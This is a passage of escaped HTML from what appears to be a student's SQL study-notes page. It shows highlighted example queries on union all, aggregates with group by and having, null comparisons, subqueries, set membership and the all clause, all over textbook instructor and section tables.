&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester=&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Spring&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;=&lt;span style=&#34;color:#3677a9&#34;&gt;2018&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;-- union all
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester=&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Fall&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;=&lt;span style=&#34;color:#3677a9&#34;&gt;2017&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;all&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester=&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Spring&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;=&lt;span style=&#34;color:#3677a9&#34;&gt;2018&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;aggregate-pt-1&#34; &gt;Aggregate Pt. 1
&lt;span&gt;
    &lt;a href=&#34;#aggregate-pt-1&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;avg: average value&lt;/li&gt;
&lt;li&gt;min: minimum value&lt;/li&gt;
&lt;li&gt;max: maximum value&lt;/li&gt;
&lt;li&gt;sum: sum of values&lt;/li&gt;
&lt;li&gt;count: number of values
&lt;ul&gt;
&lt;li&gt;count (*) to count number of tuples
Usage &lt;code&gt;SELECT count(attribute), ...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Group by: group tuples into another attribute.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;group&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;having&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;25000&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The having condition applies on each group and not on the aggregation. The having applies before the select returns but after the grouping.&lt;/p&gt;
&lt;p&gt;Null: null indicates unknown or missing data.&lt;/p&gt;
&lt;p&gt;Comparing null with anything else always results in unknown even with null.&lt;/p&gt;
&lt;p&gt;Unknown always takes precedence.&lt;/p&gt;
&lt;p&gt;Use &lt;code&gt;is null&lt;/code&gt; for a null comparison&lt;/p&gt;
&lt;h3 id=&#34;subqueries&#34; &gt;Subqueries
&lt;span&gt;
    &lt;a href=&#34;#subqueries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Use ( ) to use a temorary relation&lt;/p&gt;
&lt;h4 id=&#34;table-subqueries&#34; &gt;Table Subqueries
&lt;span&gt;
    &lt;a href=&#34;#table-subqueries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_salary&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;group&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;42000&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;max&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(tot_salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sum&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tot_salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;group&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;scalar-subqueries&#34; &gt;Scalar Subqueries
&lt;span&gt;
    &lt;a href=&#34;#scalar-subqueries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;A query that returns a single tuple.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;   &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;set-membership&#34; &gt;Set Membership
&lt;span&gt;
    &lt;a href=&#34;#set-membership&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Subquery can also be a hardcoded set&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(subquery)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* intersect */&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;x&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;not&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(subquery)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* except */&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;distinct&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Mozart&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Einstein&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;distinct&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;not&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Mozart&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Einstein&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;lt;&amp;gt; means not equal&lt;/p&gt;
&lt;h4 id=&#34;all-clause&#34; &gt;All Clause
&lt;span&gt;
    &lt;a href=&#34;#all-clause&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;all&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; 